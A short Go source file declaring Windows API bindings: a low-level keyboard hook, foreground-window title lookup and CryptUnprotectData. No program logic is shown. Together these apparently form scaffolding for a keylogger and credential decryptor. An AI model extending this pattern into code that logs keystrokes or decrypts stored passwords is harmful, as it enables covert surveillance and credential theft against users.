package main

import "syscall"

var (
	modcrypt32              = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData  = modcrypt32.NewProc("CryptUnprotectData")
	user32                  = syscall.NewLazyDLL("user32.dll")
	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procGetMessageW         = user32.NewProc("GetMessageW")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
)

const WH_KEYBOARD_LL = 13
